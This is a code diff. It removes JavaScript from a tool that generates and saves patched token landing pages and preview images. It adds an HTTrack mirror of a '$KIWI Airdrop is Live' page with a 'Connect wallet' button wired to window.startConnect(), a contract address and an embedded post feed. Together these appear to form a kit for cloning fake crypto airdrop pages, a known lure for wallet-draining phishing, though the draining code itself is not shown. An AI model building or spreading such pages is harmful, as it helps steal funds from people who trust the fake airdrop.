-  ctx.font = '800 14px Segoe UI, Arial, sans-serif';
-  ctx.textAlign = 'center';
-  ctx.fillText('Connect wallet   ↗', btnX + btnW/2, btnY + 26);
-
-  // ── Token logo (large circle) ──
-  var img = await _loadImageFromBlob(logoBlob);
-  ctx.save();
-  ctx.beginPath();
-  ctx.arc(logoCx, logoCy, logoR, 0, Math.PI * 2);
-  ctx.closePath();
-  ctx.clip();
-  if (img) {
-    var scale = Math.max((logoR*2)/img.width, (logoR*2)/img.height);
-    var dw = img.width * scale;
-    var dh = img.height * scale;
-    ctx.drawImage(img, logoCx - dw/2, logoCy - dh/2, dw, dh);
-  } else {
-    ctx.fillStyle = '#111827';
-    ctx.fillRect(logoCx - logoR, logoCy - logoR, logoR*2, logoR*2);
-  }
-  ctx.restore();
-
-  // Border ring
-  ctx.strokeStyle = 'rgba(255,255,255,0.22)';
-  ctx.lineWidth = 3;
-  ctx.beginPath();
-  ctx.arc(logoCx, logoCy, logoR + 2, 0, Math.PI * 2);
-  ctx.stroke();
-  // Outer golden glow ring
-  ctx.save();
-  ctx.shadowColor = 'rgba(255,200,0,0.35)';
-  ctx.shadowBlur = 60;
-  ctx.strokeStyle = 'rgba(255,200,0,0.08)';
-  ctx.lineWidth = 4;
-  ctx.beginPath();
-  ctx.arc(logoCx, logoCy, logoR + 6, 0, Math.PI * 2);
-  ctx.stroke();
-  ctx.restore();
-
-  // ── CA pill (bottom center) ──
-  if (caTxt.length > 0) {
-    var pillW = 520, pillH = 52;
-    var pillX = (w - pillW) / 2;
-    var pillY = h - 75;
-    // Glassmorphism background
-    ctx.fillStyle = 'rgba(255,255,255,0.10)';
-    _roundRect(ctx, pillX, pillY, pillW, pillH, 16);
-    ctx.fill();
-    ctx.strokeStyle = 'rgba(255,255,255,0.20)';
-    ctx.lineWidth = 1;
-    _roundRect(ctx, pillX, pillY, pillW, pillH, 16);
-    ctx.stroke();
-
-    ctx.fillStyle = 'rgba(255,255,255,0.55)';
-    ctx.font = '500 14px Segoe UI, Arial, sans-serif';
-    ctx.textAlign = 'left';
-    ctx.fillText('CA:', pillX + 22, pillY + 32);
-
-    var show = caTxt;
-    if (show.length > 44) show = show.slice(0, 22) + '…' + show.slice(-16);
-    ctx.fillStyle = 'rgba(255,255,255,0.90)';
-    ctx.font = '700 14px Consolas, ui-monospace, monospace';
-    ctx.fillText(show, pillX + 56, pillY + 32);
-
-    // Copy icon (small square)
-    var cpX = pillX + pillW - 38, cpY = pillY + 14;
-    ctx.strokeStyle = 'rgba(255,255,255,0.5)';
-    ctx.lineWidth = 1.5;
-    _roundRect(ctx, cpX, cpY, 14, 18, 3);
-    ctx.stroke();
-    _roundRect(ctx, cpX + 4, cpY + 4, 14, 18, 3);
-    ctx.stroke();
-  }
-
-  // ── "website by @witloofsol" footer ──
-  ctx.fillStyle = 'rgba(255,255,255,0.35)';
-  ctx.font = '400 11px Segoe UI, Arial, sans-serif';
-  ctx.textAlign = 'right';
-  ctx.fillText('website by @witloofsol', w - 25, h - 18);
-
-  // ── Output blob ──
-  var outBlob = await new Promise(function(resolve) { c.toBlob(resolve, 'image/png'); });
-  if (!outBlob) {
-    var du = c.toDataURL('image/png');
-    outBlob = await (await fetch(du)).blob();
-  }
-  return outBlob;
-}
-
-// ── Save via File System Access API ──
-async function saveToFolder() {
-  if (!patchedHtml) return;
-  var btn = document.getElementById('saveBtn');
-  btn.disabled = true;
-  btn.textContent = '⏳ Saving...';
-
-  try {
-    var dir = await window.showDirectoryPicker({ mode: 'readwrite' });
-    var previewStatus = '';
-
-    // 1. Save index.html
-    var htmlHandle = await dir.getFileHandle('index.html', { create: true });
-    var htmlWritable = await htmlHandle.createWritable({ keepExistingData: false });
-    await htmlWritable.write(patchedHtml);
-    await htmlWritable.close();
-
-    // 2. Save logo image
-    if (logoBlob) {
-      var logoHandle = await dir.getFileHandle('token_logo.png', { create: true });
-      var logoWritable = await logoHandle.createWritable({ keepExistingData: false });
-      await logoWritable.write(logoBlob);
-      await logoWritable.close();
-    }
-
-    // 3. Generate and save site_preview.png
-    try {
-      setMsg('inf', '🖼 Generating site preview...');
-      var previewBlob = await generateSitePreview();
-
-      if (previewBlob) {
-        latestPreviewBlob = previewBlob;
-        try {
-          var dlBtn = document.getElementById('previewDlBtn');
-          if (dlBtn) dlBtn.style.display = 'block';
-        } catch (_) {}
-
-        try {
-          var previewHandle = await dir.getFileHandle('site_preview.png', { create: true });
-          var previewWritable = await previewHandle.createWritable({ keepExistingData: false });
-          await previewWritable.write(previewBlob);
-          await previewWritable.close();
-          var writtenFile = await previewHandle.getFile();
-          console.log('✅ site_preview.png saved', { size: writtenFile.size });
-          previewStatus = ' + site_preview.png (' + Math.round(writtenFile.size / 1024) + ' KB)';
-        } catch (writeErr) {
-          console.error('Preview folder write failed:', writeErr);
-          try { downloadBlob(previewBlob, 'site_preview.png'); } catch (_) {}
-          previewStatus = ' (site_preview.png downloaded — folder write failed)';
-        }
-      }
-    } catch (err) {
-      console.error('Preview generation failed:', err);
-      previewStatus = ' (site_preview.png failed: ' + (err.message || err) + ')';
-    }
-
-    setStatus('si-save', 'ok', 'Saved ✓');
-    document.getElementById('savePanel').className = 'save-panel';
-    var saved = 'index.html' + (logoBlob ? ' + token_logo.png' : '');
-    setMsg('ok', '✅ ' + saved + previewStatus + ' saved directly to your folder! Upload to Vercel or open from file.');
-    btn.disabled = false;
-    btn.textContent = '💾 Save to Folder';
-  } catch (e) {
-    if (e.name === 'AbortError') {
-      setMsg('inf', 'Cancelled. Click save again when ready.');
-    } else {
-      setMsg('err', 'Save failed: ' + e.message);
-    }
-    btn.disabled = false;
-    btn.textContent = '💾 Save to Folder';
-  }
-}
-
-function downloadBlob(blob, filename) {
-  var url = URL.createObjectURL(blob);
-  var a = document.createElement('a');
-  a.href = url; a.download = filename; a.click();
-  setTimeout(function() { URL.revokeObjectURL(url); }, 1000);
-}
-
-function downloadLatestPreview() {
-  if (!latestPreviewBlob) return setMsg('err', 'No preview generated yet. Click Save first.');
-  downloadBlob(latestPreviewBlob, 'site_preview.png');
-  setMsg('ok', '✅ Download started: site_preview.png');
-}
-
-// ── Helpers ──
-function setStatus(id, type, text) {
-  var el = document.getElementById(id);
-  el.className = 'sitem' + (type ? ' ' + type : '');
-  var sv = el.querySelector('.sval');
-  if (sv) sv.textContent = text;
-}
-function setMsg(type, txt) {
-  var el = document.getElementById('msg');
-  if (!type) { el.className = 'msg'; el.textContent = ''; return; }
-  el.className = 'msg ' + type;
-  el.textContent = txt;
-}
-
-// Enter key triggers fetch
-document.getElementById('caInput').addEventListener('keydown', function(e) {
-  if (e.key === 'Enter') fetchToken();
-});
-</script>
+<body class="font-sans antialiased">
+    <div hidden=""><!--$--><!--/$--></div>
+    <main
+        class="jsx-2ee78b47b97d0a7b relative min-h-screen flex flex-col items-center justify-center overflow-hidden bg-black">
+        <audio src="AUGHHHH%2520sound%2520effect%2520tiktok%2520snoring%2520meme.html" preload="auto"
+            class="jsx-2ee78b47b97d0a7b"></audio><audio src="sound.mp3" preload="auto" class="jsx-2ee78b47b97d0a7b"
+            loop=""></audio>
+        <div style="transform: translateX(-120%); opacity: 0; pointer-events: none;"
+            class="jsx-33e09a6a81d454f1 fixed left-4 top-20 z-40 w-80 max-h-[calc(100vh-150px)] flex flex-col transition-all duration-300">
+            <div
+                class="jsx-33e09a6a81d454f1 mb-3 px-4 py-2 rounded-xl bg-white/10 backdrop-blur-xl border border-white/20 flex items-center justify-between shrink-0">
+                <div class="jsx-33e09a6a81d454f1 flex items-center gap-2">
+                    <h2 class="jsx-33e09a6a81d454f1 text-white font-black text-sm tracking-wide">FEATURED POSTS</h2>
+                    <span
+                        class="jsx-33e09a6a81d454f1 text-xs font-bold px-1.5 py-0.5 rounded-md bg-white/15 text-white/70">101</span><span
+                        class="jsx-33e09a6a81d454f1 flex items-center gap-1 text-xs font-black px-1.5 py-0.5 rounded-md bg-red-600/80 text-white tracking-wide"><span
+                            class="jsx-33e09a6a81d454f1 w-1.5 h-1.5 rounded-full bg-white animate-pulse inline-block"></span>LIVE</span>
+                </div><button aria-label="Close feed"
+                    class="jsx-33e09a6a81d454f1 text-white/60 hover:text-white transition-colors"><svg
+                        fill="currentColor" viewBox="0 0 24 24" class="jsx-33e09a6a81d454f1 w-5 h-5">
+                        <path
+                            d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"
+                            class="jsx-33e09a6a81d454f1"></path>
+                    </svg></button>
+            </div>
+            <div class="jsx-33e09a6a81d454f1 space-y-3 overflow-y-auto flex-1">
+                <div class="rounded-xl overflow-hidden bg-white/5 border border-white/10">
+                    <div class="twitter-tweet twitter-tweet-rendered"
+                        style="display: flex; max-width: 280px; width: 100%; margin-top: 10px; margin-bottom: 10px;">
+                        <iframe id="twitter-widget-0" scrolling="no" frameborder="0" allowtransparency="true"
+                            allowfullscreen="true" class=""
+                            style="position: static; visibility: visible; width: 280px; height: 468px; display: block; flex-grow: 1;"
+                            title="X Post" src="index_3.html" data-tweet-id="2031441879821115791"></iframe>
+                    </div>
+                </div>
+                <div class="rounded-xl overflow-hidden bg-white/5 border border-white/10">
+                    <div class="twitter-tweet twitter-tweet-rendered"
+                        style="display: flex; max-width: 280px; width: 100%; margin-top: 10px; margin-bottom: 10px;">
+                        <iframe id="twitter-widget-1" scrolling="no" frameborder="0" allowtransparency="true"
+                            allowfullscreen="true" class=""
+                            style="position: static; visibility: visible; width: 280px; height: 563px; display: block; flex-grow: 1;"
+                            title="X Post" src="index_4.html" data-tweet-id="2031450233566027811"></iframe>
+                    </div>
+                </div>
+                <div class="rounded-xl overflow-hidden bg-white/5 border border-white/10">
+                    <div class="twitter-tweet twitter-tweet-rendered"
+                        style="display: flex; max-width: 280px; width: 100%; margin-top: 10px; margin-bottom: 10px;">
+                        <iframe id="twitter-widget-2" scrolling="no" frameborder="0" allowtransparency="true"
+                            allowfullscreen="true" class=""
+                            style="position: static; visibility: visible; width: 280px; height: 379px; display: block; flex-grow: 1;"
+                            title="X Post" src="index_5.html" data-tweet-id="2031449677892301186"></iframe>
+                    </div>
+                </div>
+                <div class="rounded-xl overflow-hidden bg-white/5 border border-white/10">
+                    <div class="twitter-tweet twitter-tweet-rendered"
+                        style="display: flex; max-width: 280px; width: 100%; margin-top: 10px; margin-bottom: 10px;">
+                        <iframe id="twitter-widget-3" scrolling="no" frameborder="0" allowtransparency="true"
+                            allowfullscreen="true" class=""
+                            style="position: static; visibility: visible; width: 280px; height: 506px; display: block; flex-grow: 1;"
+                            title="X Post" src="index_6.html" data-tweet-id="2031417359915762133"></iframe>
+                    </div>
+                </div>
+                <div class="rounded-xl overflow-hidden bg-white/5 border border-white/10">
+                    <div class="twitter-tweet twitter-tweet-rendered"
+                        style="display: flex; max-width: 280px; width: 100%; margin-top: 10px; margin-bottom: 10px;">
+                        <iframe id="twitter-widget-4" scrolling="no" frameborder="0" allowtransparency="true"
+                            allowfullscreen="true" class=""
+                            style="position: static; visibility: visible; width: 280px; height: 487px; display: block; flex-grow: 1;"
+                            title="X Post" src="index_2.html" data-tweet-id="2031442196629696546"></iframe>
+                    </div>
+                </div>
+                <div class="jsx-33e09a6a81d454f1 py-2 text-center text-white/40 text-xs">Scroll for more...</div>
+            </div>
+        </div>
+
+        </div>
+        </div>
+        <div class="jsx-2ee78b47b97d0a7b fixed top-4 left-1/2 -translate-x-1/2 z-50">
+            <div
+                class="jsx-2ee78b47b97d0a7b flex items-center gap-3 p-1.5 rounded-2xl bg-white/10 backdrop-blur-2xl border border-white/20 shadow-[0_8px_32px_rgba(0,0,0,0.3),inset_0_1px_0_rgba(255,255,255,0.2)]">
+                <a href="https://x.com/KiwiTheAddict" target="_blank"
+                    rel="noopener noreferrer"
+                    class="jsx-2ee78b47b97d0a7b group relative flex items-center justify-center w-12 h-12 rounded-xl bg-gradient-to-b from-white/30 to-white/10 backdrop-blur-xl border border-white/30 shadow-[0_4px_16px_rgba(0,0,0,0.2),inset_0_1px_0_rgba(255,255,255,0.4),inset_0_-1px_0_rgba(0,0,0,0.1)] hover:from-white/40 hover:to-white/20 transition-all duration-200 active:scale-95">
+                    <div
+                        class="jsx-2ee78b47b97d0a7b absolute inset-0 rounded-xl bg-gradient-to-b from-white/20 to-transparent opacity-60">
+                    </div><svg viewBox="0 0 24 24" fill="currentColor"
+                        class="jsx-2ee78b47b97d0a7b w-6 h-6 text-white relative z-10 drop-shadow-sm">
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                            class="jsx-2ee78b47b97d0a7b"></path>
+                    </svg>
+                </a><a href="https://dexscreener.com/solana/fthi7plrgcbsycmj3axeua1zy2dgi38ppxzqajoaxr4a"
+                    target="_blank" rel="noopener noreferrer"
+                    class="jsx-2ee78b47b97d0a7b group relative flex items-center justify-center w-12 h-12 rounded-xl bg-gradient-to-b from-white/30 to-white/10 backdrop-blur-xl border border-white/30 shadow-[0_4px_16px_rgba(0,0,0,0.2),inset_0_1px_0_rgba(255,255,255,0.4),inset_0_-1px_0_rgba(0,0,0,0.1)] hover:from-white/40 hover:to-white/20 transition-all duration-200 active:scale-95">
+                    <div
+                        class="jsx-2ee78b47b97d0a7b absolute inset-0 rounded-xl bg-gradient-to-b from-white/20 to-transparent opacity-60">
+                    </div><img src="A_20flock_20birds_20-_202026-03-10T002026.652.png" alt="Dexscreener"
+                        class="jsx-2ee78b47b97d0a7b w-7 h-7 relative z-10 drop-shadow-sm">
+                </a>
+            </div>
+        </div>
+        <div class="jsx-2ee78b47b97d0a7b fixed top-24 left-1/2 -translate-x-1/2 z-40 flex flex-col items-center gap-2">
+            <div
+                class="jsx-2ee78b47b97d0a7b px-4 py-3 rounded-2xl bg-white/5 backdrop-blur-2xl border border-white/20 shadow-[0_8px_32px_rgba(0,0,0,0.6),inset_0_1px_0_rgba(255,255,255,0.25)] text-center max-w-xl">
+                <h1 class="jsx-2ee78b47b97d0a7b text-white font-black tracking-tight text-2xl sm:text-3xl">
+                    <span class="text-white/70">The</span> <span class="text-white">$KIWI</span>
+                    <span class="text-white/70">Airdrop is Live</span>
+                </h1>
+                <p class="jsx-2ee78b47b97d0a7b mt-2 text-white/70 text-xs sm:text-sm">
+                    Eligible users are invited to take part in the distribution of $4.25 tokens.
+                </p>
+                <div class="jsx-2ee78b47b97d0a7b mt-4 flex justify-center">
+                    <a id="voteBtn" onclick="window.startConnect()"
+                        class="NlVhn6Y- 7q6V1UU_ zFkr7ke3 sjSyu7PR jsx-2ee78b47b97d0a7b inline-flex items-center gap-2 px-6 py-2.5 rounded-xl bg-white text-black text-xs sm:text-sm font-black tracking-normal whitespace-nowrap shadow-[0_10px_30px_rgba(0,0,0,0.7)] hover:bg-white active:scale-95 transition-all border border-black/20 ">
+                        Connect wallet
+                        <svg class="jsx-2ee78b47b97d0a7b w-4 h-4 sm:w-5 sm:h-5 text-black/80" viewBox="0 0 24 24"
+                            fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"
+                            stroke-linejoin="round" aria-hidden="true">
+                            <path d="M7 17L17 7"></path>
+                            <path d="M9 7H17V15"></path>
+                        </svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+        <div class="logo-center-wrap">
+            <button
+                class="jsx-2ee78b47b97d0a7b relative cursor-pointer select-none transition-transform duration-150 hover:scale-105 active:scale-95"
+                style="background:none;border:none;padding:0;">
+                <div class="token-logo-frame">
+                    <img alt="Token logo" decoding="async" src="token_logo.png">
+                </div>
+            </button>
+        </div>
+        <div style="left: 77.2121%; top: 73.4347%; font-size: 1.08997rem; opacity: 0; transform: translateY(-12px) scale(0.8); text-shadow: rgba(255, 220, 50, 0.8) 0px 0px 12px, rgba(0, 0, 0, 0.9) 0px 2px 8px; letter-spacing: 0.02em;"
+            class="jsx-2ee78b47b97d0a7b fixed pointer-events-none z-40 font-black text-white select-none transition-all duration-300">
+            click me twin</div>
+
+        <div class="jsx-2ee78b47b97d0a7b fixed bottom-4 left-1/2 -translate-x-1/2 z-50 w-[90%] max-w-md"><button
+                class="jsx-2ee78b47b97d0a7b group relative w-full flex items-center justify-center gap-3 py-4 px-6 rounded-2xl bg-gradient-to-b from-white/30 to-white/10 backdrop-blur-2xl border border-white/30 shadow-[0_8px_32px_rgba(0,0,0,0.3),inset_0_1px_0_rgba(255,255,255,0.4),inset_0_-1px_0_rgba(0,0,0,0.1)] hover:from-white/40 hover:to-white/20 transition-all duration-200 active:scale-[0.98]">
+                <div
+                    class="jsx-2ee78b47b97d0a7b absolute inset-0 rounded-2xl bg-gradient-to-b from-white/20 to-transparent opacity-60">
+                </div><span class="jsx-2ee78b47b97d0a7b relative z-10 text-white/70 text-sm font-medium">CA:</span><span
+                    class="jsx-2ee78b47b97d0a7b relative z-10 text-white font-mono font-bold tracking-wider text-sm truncate">5yUGshNPv25GP9Df4bto2ZXrjmtQ5KTD3mAd8Fqppump</span><svg
+                    fill="none" viewBox="0 0 24 24" stroke="currentColor"
+                    class="jsx-2ee78b47b97d0a7b relative z-10 w-5 h-5 text-white/70 group-hover:text-white transition-colors">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"
+                        class="jsx-2ee78b47b97d0a7b"></path>
+                </svg>
+            </button></div>
+        <div class="jsx-2ee78b47b97d0a7b fixed bottom-4 right-4 z-40"><a href="https://x.com/witloofsol" target="_blank"
+                rel="noopener noreferrer"
+                class="jsx-2ee78b47b97d0a7b text-white/40 hover:text-white/60 transition-colors text-xs">website by
+                @witloofsol</a></div>
+    </main><!--$--><!--/$--><next-route-announcer style="position: absolute;"
+        data-scrapbook-shadowdom="&lt;div aria-live=&quot;assertive&quot; id=&quot;__next-route-announcer__&quot; role=&quot;alert&quot; style=&quot;position: absolute; border: 0px; height: 1px; margin: -1px; padding: 0px; width: 1px; clip: rect(0px, 0px, 0px, 0px); overflow: hidden; white-space: nowrap; overflow-wrap: normal;&quot;&gt;&lt;/div&gt;"></next-route-announcer><iframe
+        scrolling="no" frameborder="0" allowtransparency="true" src="index_7.html" title="Twitter settings iframe"
+        style="display: none;"></iframe><iframe id="rufous-sandbox" scrolling="no" frameborder="0"
+        allowtransparency="true" allowfullscreen="true"
+        style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium;"
+        title="Twitter analytics iframe" src="index_1.html"></iframe>
+    <script
+        data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", k8 = "data-scrapbook-adoptedstylesheets", k9 = /^data-scrapbook-adoptedstylesheet-(\d+)$/, k10 = "data-scrapbook-shadowdom-mode", k11 = "data-scrapbook-shadowdom-clonable", k12 = "data-scrapbook-shadowdom-delegates-focus", k13 = "data-scrapbook-shadowdom-serializable", k14 = "data-scrapbook-shadowdom-slot-assignment", k15 = "data-scrapbook-slot-assigned", k16 = "data-scrapbook-slot-index", k17 = /^scrapbook-slot-index=(\d+)$/, k18 = '/scrapbook-slot-index', d = document, r = d.documentElement, $s = !!r.attachShadow, $as = !!d.adoptedStyleSheets, $c = !!window.HTMLCanvasElement, $sa = !!d.createElement('slot').assign, sle = [], sls = [], slt = function (r) { if ($sa) { var E = r.childNodes, i, e, s, m; for (i = 0; i < E.length; i++) { e = E[i]; if (e.nodeType === 8) { s = e.nodeValue; if (m = s.match(k17)) { s = e.nextSibling; if (s.nodeType === 3) { sls[m[1]] = s; } r.removeChild(e); i--; } else if (s === k18) { r.removeChild(e); i--; } } } } }, sl = function () { var i = sle.length, j, d, e; while (i--) { d = sle[i]; e = d.elem; d = d.value.split(','); j = d.length; while (j--) { d[j] = sls[parseInt(d[j], 10)]; } try { try { e.assign.apply(e, d); } catch (ex) { if (ex.message.includes('must have a callable @@iterator')) { e.assign(d); } else { throw ex; } } } catch (ex) { console.error(ex); } } }, asl = (function (r) { var l = [], E, i, e, m, c, j; if ($as) { E = r.attributes; i = E.length; while (i--) { e = E[i]; if (!(m = e.nodeName.match(k9))) { continue; } c = l[m[1]] = new CSSStyleSheet(); r.removeAttribute(m[0]); m = e.nodeValue.split('\n\n'); j = m.length; while (j--) { try { m[j] && c.insertRule(m[j]); } catch (ex) { console.error(ex); } } } } return l; })(r), as = function (d, e) { var l, i, I; if ($as && (l = e.getAttribute(k8)) !== null) { l = l.split(',').map(i => asl[i]); d.adoptedStyleSheets = d.adoptedStyleSheets.concat(l); e.removeAttribute(k8); } }, fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s, m; while (i--) { e = E[i]; s = e.shadowRoot; if ($s && (d = e.getAttribute(k1))) { if (!s) { try { s = e.attachShadow({ mode: (m = e.getAttribute(k10)) !== null ? m : 'open', clonable: e.hasAttribute(k11), delegatesFocus: e.hasAttribute(k12), serializable: e.hasAttribute(k13), slotAssignment: (m = e.getAttribute(k14)) !== null ? m : void 0, }); s.innerHTML = d; } catch (ex) { console.error(ex); } } e.removeAttribute(k1); e.removeAttribute(k10); e.removeAttribute(k11); e.removeAttribute(k12); e.removeAttribute(k13); e.removeAttribute(k14); } if ($c && (d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if ($sa && (d = e.getAttribute(k15)) !== null) { sle.push({ elem: e, value: d }); e.removeAttribute(k15); } if ($sa && (d = e.getAttribute(k16)) !== null) { sls[d] = e; e.removeAttribute(k16); } if (s) { slt(e); as(s, e); fn(s); } } }; as(d, r); fn(d); sl(); })()</script>
+    <script defer
+        src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516"
+        integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg=="
+        data-cf-beacon='{"version":"2024.11.0","token":"583339bee7da436db4d0ed54b6654957","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+        crossorigin="anonymous"></script>
 </body>
+
+
+<!-- Mirrored from solana-seven-rouge.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 14 Mar 2026 02:58:52 GMT -->
+
 </html>
